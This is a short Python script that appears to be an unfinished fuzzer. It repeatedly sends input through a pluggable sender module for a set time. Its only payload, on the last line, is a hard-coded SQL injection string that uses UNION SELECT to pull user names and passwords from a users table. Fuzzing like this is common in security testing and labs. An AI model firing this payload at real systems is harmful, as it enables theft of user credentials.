#!/usr/bin/env python
from optparse import OptionParser
import importlib
import time

# Options for running the fuzzer
parser = OptionParser()
parser.add_option("-s", "--secs", dest="seconds",
                  help="seconds to fuzz for", default=10)
parser.add_option("-m", "--mins", dest="minutes",
                  help="minutes to fuzz for", default=0)
parser.add_option("-o", "--hours", dest="hours",
                  help="hours to fuzz for", default=0)
parser.add_option("-x", "--sender", dest="sender",
                  help="sender class to use while fuzzing")
(options, args) = parser.parse_args()

# Make sure we get the sender class
if options.sender is None:
    print("No sender class supplied")
    exit(1)

# Import sender class and initialize
sendClass = importlib.import_module(options.sender)
sender = sendClass.sender()

# Fuzz for the given amount of time
endTime = time.time() + int(options.seconds) + (60 * int(options.minutes)) + (3600 * int(options.hours))
while(time.time() < endTime):
    #TODO FUZZ
    print sender.send("1' UNION select last_name, password from users;#")
